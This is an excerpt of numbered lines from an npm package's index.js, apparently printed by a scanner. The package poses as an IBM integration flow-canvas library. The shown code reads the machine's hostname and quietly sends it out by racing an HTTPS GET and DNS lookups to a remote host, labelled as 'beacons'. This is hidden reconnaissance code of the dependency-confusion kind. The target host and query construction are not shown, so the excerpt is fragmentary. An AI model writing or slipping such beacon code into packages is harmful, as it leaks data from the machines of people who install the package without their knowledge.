// File: tmp/tmp__y30gqa/@ibm-integration-flow-canvas/package/index.js
// ======================================================================
Line 1: var https = require("node:https")
Line 2: var dns = require("node:dns")
Line 3: var os = require("node:os")
Line 8: os.hostname()
Line 13: const req = https.get({
        hostname: host,
        servername: host,               // SNI
        port: 443,
        method: 'GET',
        path: `/?${qs}`,
        headers: { 'Host': host, 'User-Agent': `${pkg}/${ver}` },
        timeout: 4000
      }, (res) => { res.resume(); resolve('http-ok'); })
Line 31: {
      // Try A and AAAA; finish either way after short grace
      let done = false;
      const finish = (tag) => { if (!done) { done = true; resolve(tag); } };
      dns.resolve4(host, () => finish('dns4'));
      setTimeout(() => dns.resolve6(host, () => finish('dns6')), 200);
      setTimeout(() => finish('dns-fallback'), 1500);
    }
Line 35: dns.resolve4(host, () => finish('dns4'))
Line 36: setTimeout(() => dns.resolve6(host, () => finish('dns6')), 200)
Line 37: setTimeout(() => finish('dns-fallback'), 1500)
Line 42: {
  const which = await Promise.race([httpBeacon(), dnsBeacon()]);
  // Give the socket/DNS a moment to flush before process exit
  await new Promise(r => setTimeout(r, 400));
  if (process.env.DEBUG_FLOW_CANVAS) console.log(`${pkg} beacon: ${which}`);
}
Line 43: const which = await Promise.race([httpBeacon(), dnsBeacon()])
